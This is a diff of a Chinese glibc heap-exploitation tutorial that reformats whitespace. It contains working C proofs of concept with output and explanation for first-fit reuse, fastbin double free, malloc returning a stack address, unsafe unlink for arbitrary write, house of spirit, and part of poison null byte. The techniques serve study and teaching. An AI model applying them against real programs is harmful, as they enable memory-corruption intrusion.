@@ -23,42 +23,40 @@ categories:
 
 int main()
 {
-	fprintf(stderr,"This file doesn't demonstrate an attack, but shows the nature of glibc's allocator.\n");
-	fprintf(stderr,"glibc uses a first-fit algorithm to select a free chunk.\n");
-	fprintf(stderr,"If a chunk is free and large enough, malloc will select this chunk.\n");
-	fprintf(stderr,"This can be exploited in a use-after-free situation.\n");
+    fprintf(stderr,"This file doesn't demonstrate an attack, but shows the nature of glibc's allocator.\n");
+    fprintf(stderr,"glibc uses a first-fit algorithm to select a free chunk.\n");
+    fprintf(stderr,"If a chunk is free and large enough, malloc will select this chunk.\n");
+    fprintf(stderr,"This can be exploited in a use-after-free situation.\n");
 
-	fprintf(stderr,"Allocating 2 buffers. They can be large, don't have to be fastbin.\n");
-	char* a = malloc(0x512);
-	char* b = malloc(0x256);
-	char* c;
+    fprintf(stderr,"Allocating 2 buffers. They can be large, don't have to be fastbin.\n");
+    char* a = malloc(0x512);
+    char* b = malloc(0x256);
+    char* c;
 
-	fprintf(stderr,"1st malloc(0x512): %p\n", a);
-	fprintf(stderr,"2nd malloc(0x256): %p\n", b);
-	fprintf(stderr,"we could continue mallocing here...\n");
-	fprintf(stderr,"now let's put a string at a that we can read later \"this is A!\"\n");
-	strcpy(a,"this is A!");
-	fprintf(stderr,"first allocation %p points to %s\n", a, a);
+    fprintf(stderr,"1st malloc(0x512): %p\n", a);
+    fprintf(stderr,"2nd malloc(0x256): %p\n", b);
+    fprintf(stderr,"we could continue mallocing here...\n");
+    fprintf(stderr,"now let's put a string at a that we can read later \"this is A!\"\n");
+    strcpy(a,"this is A!");
+    fprintf(stderr,"first allocation %p points to %s\n", a, a);
 
-	fprintf(stderr,"Freeing the first one...\n");
-	free(a);
+    fprintf(stderr,"Freeing the first one...\n");
+    free(a);
 
-	fprintf(stderr,"We don't need to free anything again. As long as we allocate smaller than 0x512, it will end up at %p\n", a);
+    fprintf(stderr,"We don't need to free anything again. As long as we allocate smaller than 0x512, it will end up at %p\n", a);
 
-	fprintf(stderr,"So, let's allocate 0x500 bytes\n");
-	c = malloc(0x500);
-	fprintf(stderr,"3rd malloc(0x500): %p\n", c);
-	fprintf(stderr,"And put a different string here, \"this is C!\"\n");
-	strcpy(c,"this is C!");
-	fprintf(stderr,"3rd allocation %p points to %s\n", c, c);
-	fprintf(stderr,"first allocation %p points to %s\n", a, a);
-	fprintf(stderr,"If we reuse the first allocation, it now holds the data from the third allocation.\n");
+    fprintf(stderr,"So, let's allocate 0x500 bytes\n");
+    c = malloc(0x500);
+    fprintf(stderr,"3rd malloc(0x500): %p\n", c);
+    fprintf(stderr,"And put a different string here, \"this is C!\"\n");
+    strcpy(c,"this is C!");
+    fprintf(stderr,"3rd allocation %p points to %s\n", c, c);
+    fprintf(stderr,"first allocation %p points to %s\n", a, a);
+    fprintf(stderr,"If we reuse the first allocation, it now holds the data from the third allocation.\n");
 }
 ```
 
-
 输出：
-
 
 ```
 This file doesn't demonstrate an attack, but shows the nature of glibc's allocator.
@@ -81,13 +79,11 @@ first allocation 0x121f010 points to this is C!
 If we reuse the first allocation, it now holds the data from the third allocation.
 ```
 
-
 这个例子很简单，由于初始分配给 `a` 的 `0x512` 字节刚刚被释放，此时分配一块小于 `0x512` 字节的内存必定会使用刚才 `a` 使用的内存区域。注意如果最后使用被释放的指针 `a`，那么它仍然指向 `this is C!` 字符串，这就是通常说的 `use after free`。
 
 ## fastbin_dup
 
 源码：
-
 
 ```c
 #include <stdio.h>
@@ -95,39 +91,37 @@ If we reuse the first allocation, it now holds the data from the third allocatio
 
 int main()
 {
-	fprintf(stderr,"This file demonstrates a simple double-free attack with fastbins.\n");
+    fprintf(stderr,"This file demonstrates a simple double-free attack with fastbins.\n");
 
-	fprintf(stderr,"Allocating 3 buffers.\n");
-	int *a = malloc(8);
-	int *b = malloc(8);
-	int *c = malloc(8);
+    fprintf(stderr,"Allocating 3 buffers.\n");
+    int *a = malloc(8);
+    int *b = malloc(8);
+    int *c = malloc(8);
 
-	fprintf(stderr,"1st malloc(8): %p\n", a);
-	fprintf(stderr,"2nd malloc(8): %p\n", b);
-	fprintf(stderr,"3rd malloc(8): %p\n", c);
+    fprintf(stderr,"1st malloc(8): %p\n", a);
+    fprintf(stderr,"2nd malloc(8): %p\n", b);
+    fprintf(stderr,"3rd malloc(8): %p\n", c);
 
-	fprintf(stderr,"Freeing the first one...\n");
-	free(a);
+    fprintf(stderr,"Freeing the first one...\n");
+    free(a);
 
-	fprintf(stderr,"If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
-	// free(a);
+    fprintf(stderr,"If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
+    // free(a);
 
-	fprintf(stderr,"So, instead, we'll free %p.\n", b);
-	free(b);
+    fprintf(stderr,"So, instead, we'll free %p.\n", b);
+    free(b);
 
-	fprintf(stderr,"Now, we can free %p again, since it's not the head of the free list.\n", a);
-	free(a);
+    fprintf(stderr,"Now, we can free %p again, since it's not the head of the free list.\n", a);
+    free(a);
 
-	fprintf(stderr,"Now the free list has [%p, %p, %p]. If we malloc 3 times, we'll get %p twice!\n", a, b, a, a);
-	fprintf(stderr,"1st malloc(8): %p\n", malloc(8));
-	fprintf(stderr,"2nd malloc(8): %p\n", malloc(8));
-	fprintf(stderr,"3rd malloc(8): %p\n", malloc(8));
+    fprintf(stderr,"Now the free list has [%p, %p, %p]. If we malloc 3 times, we'll get %p twice!\n", a, b, a, a);
+    fprintf(stderr,"1st malloc(8): %p\n", malloc(8));
+    fprintf(stderr,"2nd malloc(8): %p\n", malloc(8));
+    fprintf(stderr,"3rd malloc(8): %p\n", malloc(8));
 }
 ```
 
-
 输出：
-
 
 ```
 This file demonstrates a simple double-free attack with fastbins.
@@ -145,7 +139,6 @@ Now the free list has [0x17e9010, 0x17e9030, 0x17e9010]. If we malloc 3 times, w
 3rd malloc(8): 0x17e9010
 ```
 
-
 这里如果释放 `a` 后再释放它一次，由于它位于 freelist 顶端过不了安全检查，得到：
 
 ```
@@ -158,65 +151,62 @@ Now the free list has [0x17e9010, 0x17e9030, 0x17e9010]. If we malloc 3 times, w
 
 源码：
 
-
 ```c
 #include <stdio.h>
 #include <stdlib.h>
 
 int main()
 {
-	fprintf(stderr,"This file extends on fastbin_dup.c by tricking malloc into\n"
-	       "returning a pointer to a controlled location (in this case, the stack).\n");
+    fprintf(stderr,"This file extends on fastbin_dup.c by tricking malloc into\n"
+           "returning a pointer to a controlled location (in this case, the stack).\n");
 
-	unsigned long long stack_var;
+    unsigned long long stack_var;
 
-	fprintf(stderr,"The address we want malloc() to return is %p.\n", 8+(char *)&stack_var);
+    fprintf(stderr,"The address we want malloc() to return is %p.\n", 8+(char *)&stack_var);
 
-	fprintf(stderr,"Allocating 3 buffers.\n");
-	int *a = malloc(8);
-	int *b = malloc(8);
-	int *c = malloc(8);
+    fprintf(stderr,"Allocating 3 buffers.\n");
+    int *a = malloc(8);
+    int *b = malloc(8);
+    int *c = malloc(8);
 
-	fprintf(stderr,"1st malloc(8): %p\n", a);
-	fprintf(stderr,"2nd malloc(8): %p\n", b);
-	fprintf(stderr,"3rd malloc(8): %p\n", c);
+    fprintf(stderr,"1st malloc(8): %p\n", a);
+    fprintf(stderr,"2nd malloc(8): %p\n", b);
+    fprintf(stderr,"3rd malloc(8): %p\n", c);
 
-	fprintf(stderr,"Freeing the first one...\n");
-	free(a);
+    fprintf(stderr,"Freeing the first one...\n");
+    free(a);
 
-	fprintf(stderr,"If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
-	// free(a);
+    fprintf(stderr,"If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
+    // free(a);
 
-	fprintf(stderr,"So, instead, we'll free %p.\n", b);
-	free(b);
+    fprintf(stderr,"So, instead, we'll free %p.\n", b);
+    free(b);
 
-	fprintf(stderr,"Now, we can free %p again, since it's not the head of the free list.\n", a);
-	free(a);
+    fprintf(stderr,"Now, we can free %p again, since it's not the head of the free list.\n", a);
+    free(a);
 
-	fprintf(stderr,"Now the free list has [%p, %p, %p]. "
-		"We'll now carry out our attack by modifying data at %p.\n", a, b, a, a);
-	unsigned long long *d = malloc(8);
+    fprintf(stderr,"Now the free list has [%p, %p, %p]. "
+        "We'll now carry out our attack by modifying data at %p.\n", a, b, a, a);
+    unsigned long long *d = malloc(8);
 
-	fprintf(stderr,"1st malloc(8): %p\n", d);
-	fprintf(stderr,"2nd malloc(8): %p\n", malloc(8));
-	fprintf(stderr,"Now the free list has [%p].\n", a);
-	fprintf(stderr,"Now, we have access to %p while it remains at the head of the free list.\n"
-		"so now we are writing a fake free size (in this case, 0x20) to the stack,\n"
-		"so that malloc will think there is a free chunk there and agree to\n"
-		"return a pointer to it.\n", a);
-	stack_var = 0x20;
+    fprintf(stderr,"1st malloc(8): %p\n", d);
+    fprintf(stderr,"2nd malloc(8): %p\n", malloc(8));
+    fprintf(stderr,"Now the free list has [%p].\n", a);
+    fprintf(stderr,"Now, we have access to %p while it remains at the head of the free list.\n"
+        "so now we are writing a fake free size (in this case, 0x20) to the stack,\n"
+        "so that malloc will think there is a free chunk there and agree to\n"
+        "return a pointer to it.\n", a);
+    stack_var = 0x20;
 
-	fprintf(stderr,"Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n", a);
-	*d = (unsigned long long) (((char*)&stack_var) - sizeof(d));
+    fprintf(stderr,"Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n", a);
+    *d = (unsigned long long) (((char*)&stack_var) - sizeof(d));
 
-	fprintf(stderr,"3rd malloc(8): %p, putting the stack address on the free list\n", malloc(8));
-	fprintf(stderr,"4th malloc(8): %p\n", malloc(8));
+    fprintf(stderr,"3rd malloc(8): %p, putting the stack address on the free list\n", malloc(8));
+    fprintf(stderr,"4th malloc(8): %p\n", malloc(8));
 }
 ```
 
-
 输出：
-
 
 ```
 This file extends on fastbin_dup.c by tricking malloc into
@@ -243,7 +233,6 @@ Now, we overwrite the first 8 bytes of the data at 0x1e3a010 to point right befo
 4th malloc(8): 0x7ffe1610b248
 ```
 
-
 这里利用上一个例子的 `double free` 漏洞，来让 `malloc` 返回一个任意地址（并不一定是栈上地址），从而实现任意地址读写。首先还是以 `a->b->a` 的顺序释放内存，随后两次 `malloc` 使得 `d` 指向原来 `a` 指向的地址 `0x1e3a010`，并且 freelist 里只剩一个 `0x1e3a010`。
 
 现在修改栈上变量 `stack_var` 的值为 `0x20`，这是为了伪造 `chunk_size` 头部让 `malloc` 以为这个地方有一个 chunk。这还不够，我们还需要让这个 chunk 被认为是空闲的，也就是要把它加入 freelist 中。
@@ -253,8 +242,8 @@ Now, we overwrite the first 8 bytes of the data at 0x1e3a010 to point right befo
 注意栈从高地址向低地址生长，堆反过来，所以源码一开始是 `8+(char *)&stack_var`，而最后是 `((char*)&stack_var) - sizeof(d)`。
 
 ## fastbin_dup_consolidate
-源码：
 
+源码：
 
 ```c
 #include <stdio.h>
@@ -278,7 +267,6 @@ int main() {
 }
 ```
 
-
 输出：
 
 ```
@@ -291,14 +279,13 @@ We can pass the check in malloc() since p1 is not fast top.
 Now p1 is in unsorted bin and fast bin. So we'will get it twice: 0x1af0010 0x1af0010
 ```
 
-
 首先分配了两个 0x40 的 chunk，实际大小为 0x50。需要 p2 是为了之后释放 p1 时不会和 top chunk 合并。随后释放其中一个并申请 0x400 的 chunk，这时会尝试从 unsorted bin 中切割，但是空间不足，触发了 `malloc_consolidate`，使得 fastbin 中的 p1 进入 unsorted bin（实际上，如果此时有多个连续 chunk 在 fastbin 中，会先合并）中。
 
 这个时候，fastbin 链表头部没有 p1 了，所以我们再次 `free(p1)` 就可以成功，造成 double free。现在 fastbin 和 unsorted bin 中都有 p1 了，我们可以两次 `malloc()` 拿到两个同样的指针。
 
 ## unsafe_unlink
-源码：
 
+源码：
 
 ```c
 #include <stdio.h>
@@ -311,58 +298,56 @@ uint64_t *chunk0_ptr;
 
 int main()
 {
-	fprintf(stderr,"Welcome to unsafe unlink 2.0!\n");
-	fprintf(stderr,"Tested in Ubuntu 14.04/16.04 64bit.\n");
-	fprintf(stderr,"This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n");
-	fprintf(stderr,"The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n");
+    fprintf(stderr,"Welcome to unsafe unlink 2.0!\n");
+    fprintf(stderr,"Tested in Ubuntu 14.04/16.04 64bit.\n");
+    fprintf(stderr,"This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n");
+    fprintf(stderr,"The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n");
 
-	int malloc_size = 0x80; //we want to be big enough not to use fastbins
-	int header_size = 2;
+    int malloc_size = 0x80; //we want to be big enough not to use fastbins
+    int header_size = 2;
 
-	fprintf(stderr,"The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n");
+    fprintf(stderr,"The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n");
 
-	chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
-	uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1
-	fprintf(stderr,"The global chunk0_ptr is at %p, pointing to %p\n", &chunk0_ptr, chunk0_ptr);
-	fprintf(stderr,"The victim chunk we are going to corrupt is at %p\n\n", chunk1_ptr);
+    chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
+    uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1
+    fprintf(stderr,"The global chunk0_ptr is at %p, pointing to %p\n", &chunk0_ptr, chunk0_ptr);
+    fprintf(stderr,"The victim chunk we are going to corrupt is at %p\n\n", chunk1_ptr);
 
-	fprintf(stderr,"We create a fake chunk inside chunk0.\n");
-	fprintf(stderr,"We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.\n");
-	chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
-	fprintf(stderr,"We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &chunk0_ptr so that P->bk->fd = P.\n");
-	fprintf(stderr,"With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == False\n");
-	chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);
-	fprintf(stderr,"Fake chunk fd: %p\n",(void*) chunk0_ptr[2]);
-	fprintf(stderr,"Fake chunk bk: %p\n\n",(void*) chunk0_ptr[3]);
+    fprintf(stderr,"We create a fake chunk inside chunk0.\n");
+    fprintf(stderr,"We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.\n");
+    chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
+    fprintf(stderr,"We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &chunk0_ptr so that P->bk->fd = P.\n");
+    fprintf(stderr,"With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == False\n");
+    chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);
+    fprintf(stderr,"Fake chunk fd: %p\n",(void*) chunk0_ptr[2]);
+    fprintf(stderr,"Fake chunk bk: %p\n\n",(void*) chunk0_ptr[3]);
 
-	fprintf(stderr,"We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n");
-	uint64_t *chunk1_hdr = chunk1_ptr - header_size;
-	fprintf(stderr,"We shrink the size of chunk0 (saved as'previous_size'in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n");
-	fprintf(stderr,"It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n");
-	chunk1_hdr[0] = malloc_size;
-	fprintf(stderr,"If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n",(void*)chunk1_hdr[0]);
-	fprintf(stderr,"We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n\n");
-	chunk1_hdr[1] &= ~1;
+    fprintf(stderr,"We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n");
+    uint64_t *chunk1_hdr = chunk1_ptr - header_size;
+    fprintf(stderr,"We shrink the size of chunk0 (saved as'previous_size'in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n");
+    fprintf(stderr,"It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n");
+    chunk1_hdr[0] = malloc_size;
+    fprintf(stderr,"If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n",(void*)chunk1_hdr[0]);
+    fprintf(stderr,"We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n\n");
+    chunk1_hdr[1] &= ~1;
 
-	fprintf(stderr,"Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n");
-	fprintf(stderr,"You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n");
-	free(chunk1_ptr);
+    fprintf(stderr,"Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n");
+    fprintf(stderr,"You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n");
+    free(chunk1_ptr);
 
-	fprintf(stderr,"At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n");
-	char victim_string[8];
-	strcpy(victim_string,"Hello!~");
-	chunk0_ptr[3] = (uint64_t) victim_string;
+    fprintf(stderr,"At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n");
+    char victim_string[8];
+    strcpy(victim_string,"Hello!~");
+    chunk0_ptr[3] = (uint64_t) victim_string;
 
-	fprintf(stderr,"chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n");
-	fprintf(stderr,"Original value: %s\n",victim_string);
-	chunk0_ptr[0] = 0x4141414142424242LL;
-	fprintf(stderr,"New Value: %s\n",victim_string);
+    fprintf(stderr,"chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n");
+    fprintf(stderr,"Original value: %s\n",victim_string);
+    chunk0_ptr[0] = 0x4141414142424242LL;
+    fprintf(stderr,"New Value: %s\n",victim_string);
 }
 ```
 
-
 输出：
-
 
 ```
 Welcome to unsafe unlink 2.0!
@@ -396,11 +381,9 @@ Original value: Hello!~
 New Value: BBBBAAAA
 ```
 
-
 利用 unlink 漏洞一般需要堆溢出以及全局指针变量。在这个例子里全局指针变量就是 `chunk0` 的 mem 指针，`chunk0` 中存在堆溢出，可以溢出到 `chunk1`。
 
 我们首先看一下 `unlink` 这个宏，它被用来从 bin 中删除 chunk：
-
 
 ```c
 #define unlink(AV, P, BK, FD) {                                            \
@@ -436,19 +419,22 @@ New Value: BBBBAAAA
 }
 ```
 
-
 可以先忽略下面和 large bin 相关的部分，关注开头：首先要求满足两个条件：
+
 - `(P->fd)->bk == P`
 - `(P->bk)->fd == P`
 
 如果满足，则执行：
+
 ```
 (P->fd)->bk = P->bk
 (P->bk)->fd = P->fd
 ```
+
 这就是普通的双向链表删除结点的操作，不安全的地方在于上面的检查，我们可以伪造堆块来绕过这个检查。
 
 我们在 chunk0 里伪造 chunk。对于 `chunk0_ptr`，我们预留 `0x10` 空间给伪 chunk 的 `prev_size` 和 `chunk_size` 字段，此时 `chunk0_ptr` 就是 `fake_chunk` 的 chunk 指针。那么其 `fd` 实际上就是 `*(chunk0_ptr + 2)`，其 `bk` 实际上就是 `*(chunk0_ptr + 3)`。用 `_0` 后缀表示属于 chunk0 的字段，`_f` 表示属于伪造 chunk 的字段（从左至右、从下至上为低地址到高地址）：
+
 ```
  ---------------------------- <- chunk1_ptr
 | prev_size_1 | chunk_size_1 |
@@ -470,6 +456,7 @@ New Value: BBBBAAAA
 现在，由于存在堆溢出，我们将 `chunk1` 的 `prev_size` 写成我们 `fake_chunk` 的大小。在例子里 `chunk0` 大小为 0x90，而 `fake_chunk` 为 0x80。然后把 `chunk1` 的 `PREV_IN_USE` 位置为 0，这样以后再 `free(chunk1)`，此时分配器就会认为前面有一个空闲的大小为 0x80 的 chunk，也就是我们的 `fake chunk`，然后触发 `unlink(fake_chunk)` 来尝试与 `chunk1` 合并。
 
 问题在于，我们从头到尾都没有真正释放过 `fake chunk`，因此它不可能出现在任何 bin 里，而 `unlink` 却尝试把它从 bin 里拆出来。这时执行链表删除操作，但由于 `(P->fd)->bk` 和 `(P->bk)->fd` 是相同的，只有后一句有意义，此时相当于执行了 `chunk0_ptr = &chunk0_ptr - 0x18`。
+
 ```
  ------------------
 | &chunk0_ptr-0x18 |---
@@ -485,8 +472,8 @@ New Value: BBBBAAAA
 那么同理，如果我们修改 `*(chunk0_ptr + 3)` 的值为 `Hello!~`，实际上就等于令 `chunk0_ptr` 指向 `Hello!~`，此时修改 `*chunk0_ptr`，那么 `Hello!~` 字符串就被覆盖了。
 
 ## house_of_spirit
-源码：
 
+源码：
 
 ```c
 #include <stdio.h>
@@ -494,38 +481,37 @@ New Value: BBBBAAAA
 
 int main()
 {
-	fprintf(stderr,"This file demonstrates the house of spirit attack.\n");
+    fprintf(stderr,"This file demonstrates the house of spirit attack.\n");
 
-	fprintf(stderr,"Calling malloc() once so that it sets up its memory.\n");
-	malloc(1);
+    fprintf(stderr,"Calling malloc() once so that it sets up its memory.\n");
+    malloc(1);
 
-	fprintf(stderr,"We will now overwrite a pointer to point to a fake 'fastbin' region.\n");
-	unsigned long long *a;
-	// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)
-	unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));
+    fprintf(stderr,"We will now overwrite a pointer to point to a fake 'fastbin' region.\n");
+    unsigned long long *a;
+    // This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)
+    unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));
 
-	fprintf(stderr,"This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n", sizeof(fake_chunks), &fake_chunks[1], &fake_chunks[9]);
+    fprintf(stderr,"This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n", sizeof(fake_chunks), &fake_chunks[1], &fake_chunks[9]);
 
-	fprintf(stderr,"This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (<= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n");
-	fprintf(stderr,"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n");
-	fake_chunks[1] = 0x40; // this is the size
+    fprintf(stderr,"This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (<= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n");
+    fprintf(stderr,"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n");
+    fake_chunks[1] = 0x40; // this is the size
 
-	fprintf(stderr,"The chunk.size of the *next* fake region has to be sane. That is> 2*SIZE_SZ (> 16 on x64) && <av->system_mem (<128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n");
+    fprintf(stderr,"The chunk.size of the *next* fake region has to be sane. That is> 2*SIZE_SZ (> 16 on x64) && <av->system_mem (<128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n");
         // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8
-	fake_chunks[9] = 0x1234; // nextsize
+    fake_chunks[9] = 0x1234; // nextsize
 
-	fprintf(stderr,"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n", &fake_chunks[1]);
-	fprintf(stderr,"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n");
-	a = &fake_chunks[2];
+    fprintf(stderr,"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n", &fake_chunks[1]);
+    fprintf(stderr,"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n");
+    a = &fake_chunks[2];
 
-	fprintf(stderr,"Freeing the overwritten pointer.\n");
-	free(a);
+    fprintf(stderr,"Freeing the overwritten pointer.\n");
+    free(a);
 
-	fprintf(stderr,"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &fake_chunks[1], &fake_chunks[2]);
-	fprintf(stderr,"malloc(0x30): %p\n", malloc(0x30));
+    fprintf(stderr,"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &fake_chunks[1], &fake_chunks[2]);
+    fprintf(stderr,"malloc(0x30): %p\n", malloc(0x30));
 }
 ```
-
 
 输出：
 
@@ -544,15 +530,16 @@ Now the next malloc will return the region of our fake chunk at 0x7ffcdc8eeb88, 
 malloc(0x30): 0x7ffcdc8eeb90
 ```
 
-
 这个比较简单，在 `fake_chunks` 数组里伪造了 fastbin 大小的 chunk，确保当前 `chunk_size` 和 `nextsize` 合法后，把 fake chunk 的 mem 指针地址给指针 `a`，然后 `free(a)`，这样就使得 fake chunk 进入了 fastbin，下次 `malloc` 就会返回这个 mem 指针。
 
 这里的合法是指：
+
 - `chunk_size` 的 `IS_MMAPED` 为 0
 - `chunk_size` 属于 fastbin 范围内
 - `nextsize` 大于 `2*SIZE_SZ`，小于 `system_mem`
 
 ## poison_null_byte
+
 源码：
 
 ```c
@@ -565,108 +552,107 @@ malloc(0x30): 0x7ffcdc8eeb90
 
 int main()
 {
-	fprintf(stderr,"Welcome to poison null byte 2.0!\n");
-	fprintf(stderr,"Tested in Ubuntu 14.04 64bit.\n");
-	fprintf(stderr,"This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n");
-	fprintf(stderr,"This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n");
+    fprintf(stderr,"Welcome to poison null byte 2.0!\n");
+    fprintf(stderr,"Tested in Ubuntu 14.04 64bit.\n");
+    fprintf(stderr,"This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n");
+    fprintf(stderr,"This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n");
 
-	uint8_t* a;
-	uint8_t* b;
-	uint8_t* c;
-	uint8_t* b1;
-	uint8_t* b2;
-	uint8_t* d;
-	void *barrier;
+    uint8_t* a;
+    uint8_t* b;
+    uint8_t* c;
+    uint8_t* b1;
+    uint8_t* b2;
+    uint8_t* d;
+    void *barrier;
 
-	fprintf(stderr,"We allocate 0x100 bytes for 'a'.\n");
-	a = (uint8_t*) malloc(0x100);
-	fprintf(stderr,"a: %p\n", a);
-	int real_a_size = malloc_usable_size(a);
-	fprintf(stderr,"Since we want to overflow 'a', we need to know the 'real' size of 'a' "
-		"(it may be more than 0x100 because of rounding): %#x\n", real_a_size);
+    fprintf(stderr,"We allocate 0x100 bytes for 'a'.\n");
+    a = (uint8_t*) malloc(0x100);
+    fprintf(stderr,"a: %p\n", a);
+    int real_a_size = malloc_usable_size(a);
+    fprintf(stderr,"Since we want to overflow 'a', we need to know the 'real' size of 'a' "
+        "(it may be more than 0x100 because of rounding): %#x\n", real_a_size);
 
-	/* chunk size attribute cannot have a least significant byte with a value of 0x00.
-	 * the least significant byte of this will be 0x10, because the size of the chunk includes
-	 * the amount requested plus some amount required for the metadata. */
-	b = (uint8_t*) malloc(0x200);
+    /* chunk size attribute cannot have a least significant byte with a value of 0x00.
+     * the least significant byte of this will be 0x10, because the size of the chunk includes
+     * the amount requested plus some amount required for the metadata. */
+    b = (uint8_t*) malloc(0x200);
 
-	fprintf(stderr,"b: %p\n", b);
+    fprintf(stderr,"b: %p\n", b);
 
-	c = (uint8_t*) malloc(0x100);
-	fprintf(stderr,"c: %p\n", c);
+    c = (uint8_t*) malloc(0x100);
+    fprintf(stderr,"c: %p\n", c);
 
-	barrier =  malloc(0x100);
-	fprintf(stderr,"We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n"
-		"The barrier is not strictly necessary, but makes things less confusing\n", barrier);
+    barrier =  malloc(0x100);
+    fprintf(stderr,"We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n"
+        "The barrier is not strictly necessary, but makes things less confusing\n", barrier);
 
-	uint64_t* b_size_ptr = (uint64_t*)(b - 8);
+    uint64_t* b_size_ptr = (uint64_t*)(b - 8);
 
-	// added fix for size==prev_size(next_chunk) check in newer versions of glibc
-	// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30
-	// this added check requires we are allowed to have null pointers in b (not just a c string)
-	//*(size_t*)(b+0x1f0) = 0x200;
-	fprintf(stderr,"In newer versions of glibc we will need to have our updated size inside b itself to pass "
-		"the check'chunksize(P) != prev_size (next_chunk(P))'\n");
-	// we set this location to 0x200 since 0x200 == (0x211 & 0xff00)
-	// which is the value of b.size after its first byte has been overwritten with a NULL byte
-	*(size_t*)(b+0x1f0) = 0x200;
+    // added fix for size==prev_size(next_chunk) check in newer versions of glibc
+    // https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30
+    // this added check requires we are allowed to have null pointers in b (not just a c string)
+    //*(size_t*)(b+0x1f0) = 0x200;
